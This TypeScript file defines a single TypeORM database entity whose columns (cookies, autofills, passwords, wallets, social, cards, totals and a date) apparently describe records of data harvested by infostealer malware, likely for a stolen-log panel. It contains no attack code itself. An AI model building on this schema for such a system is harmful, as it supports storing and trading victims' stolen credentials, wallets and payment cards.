import { Entity, PrimaryGeneratedColumn, Column, } from "typeorm";

@Entity({ name: "SET" })
export class Set {

    @PrimaryGeneratedColumn()
    id: number;

    @Column({ unique: false })
    total: string;

    @Column({ unique: false })
    cookies: string;

    @Column({ unique: false })
    autofills: string;

    @Column({ unique: false })
    passwords: string;

    @Column({ unique: false })
    wallets: string;

    @Column({ unique: false })
    social: string;

    @Column({ unique: false })
    cards: string;

    @Column({ unique: false })
    date: string;

}